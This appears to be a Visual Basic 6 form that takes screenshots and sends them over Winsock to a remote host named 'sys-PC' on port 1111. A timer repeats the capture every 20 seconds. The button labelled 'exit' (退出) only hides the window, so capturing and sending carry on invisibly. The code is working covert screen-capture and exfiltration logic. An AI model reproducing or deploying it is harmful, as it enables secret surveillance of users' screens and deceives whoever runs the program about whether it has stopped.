VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   8130
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   12885
   LinkTopic       =   "Form1"
   ScaleHeight     =   8130
   ScaleWidth      =   12885
   StartUpPosition =   3  '窗口缺省
   Begin VB.Timer Timer1 
      Left            =   0
      Top             =   480
   End
   Begin VB.CommandButton Command2 
      Caption         =   "退出"
      Height          =   855
      Left            =   11040
      TabIndex        =   2
      Top             =   0
      Width           =   1695
   End
   Begin VB.PictureBox Picture1 
      Height          =   6495
      Left            =   120
      ScaleHeight     =   6435
      ScaleWidth      =   12555
      TabIndex        =   1
      Top             =   1560
      Width           =   12615
   End
   Begin VB.CommandButton Command1 
      Caption         =   "截屏"
      Height          =   1335
      Left            =   480
      TabIndex        =   0
      Top             =   0
      Width           =   1935
   End
   Begin MSWinsockLib.Winsock satellite 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private filename1 As String '发
Private filename2 As String '收
Private max_got As Long
Private sent As Long
Private max_sent As Long
Private arrival As Boolean
Private filedata()  As Byte
Private wsindex As Integer
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Const thescreen = 0
Const theform = 0

Private Sub Command1_Click()
Form1.Hide
Call keybd_event(vbKeySnapshot, thescreen, 1, 1)
ReDim filedata(1 To 9500)
arrival = False
filename1 = Str(Year(Date) & Month(Date) & Day(Date) & Hour(Time) & Minute(Time) & Second(Time)) '"abc" 'Str(CVar(Now))
satellite(2).SendData arrival
sent = 0
Command1.Enabled = False
Timer1.Enabled = True

If Command2.Enabled = True Then
Form1.Show
End If
End Sub

Private Sub Command2_Click()
Form1.Hide
Command2.Enabled = False
End Sub

Private Sub Form_Load()
Dim i As Integer
For i = 1 To 6
Load satellite(i)
satellite(i).RemoteHost = "sys-PC"
satellite(i).RemotePort = 1111
satellite(i).Connect
Next i
Timer1.Interval = 20000
End Sub


Private Sub satellite_Close(Index As Integer)
Unload Me
End Sub

Private Sub satellite_DataArrival(Index As Integer, ByVal bytesTotal As Long)
'On Error GoTo Line1
ReDim filedata(1 To 9500)
Select Case Index
Case 3
If arrival = False Then
satellite(3).GetData filename2, vbString
arrival = True
Open App.Path & "\data\receive\" & filename2 & ".bmp" For Binary As #2
satellite(6).SendData arrival
Else
satellite(3).GetData filedata(), vbByte
Put #2, , filedata()
satellite(6).SendData arrival
End If

Case 2
SavePicture Clipboard.GetData(vbCFBitmap), App.Path & "\data\post\" & filename1 & ".bmp"  '发
Open App.Path & "\data\post\" & filename1 & ".bmp" For Binary As #1   '发
max_sent = LOF(1)
satellite(4).SendData filename1
Case 4

If sent > max_sent Then
Close #1
arrival = False
satellite(3).SendData arrival
Exit Sub
End If
Get #1, sent + 1, filedata()
sent = sent + 9500
satellite(4).SendData filedata()

Case 6
arrival = False
'Picture1.Picture = LoadPicture(App.Path & "\data\receive\" & filename2 & ".bmp")
Command1.Enabled = True
Close
'Kill (App.Path & "\data\receive\" & filename1 & ".bmp")

End Select

'Line1
'Dim a As Integer
'a = MsgBox("你太暴力了，系统崩溃，错误代码" & Err.Number & "建议返厂维修", vbOKOnly, "R-20出错")
'Unload Me



End Sub

Private Sub Timer1_Timer()
Call Command1_Click
End Sub
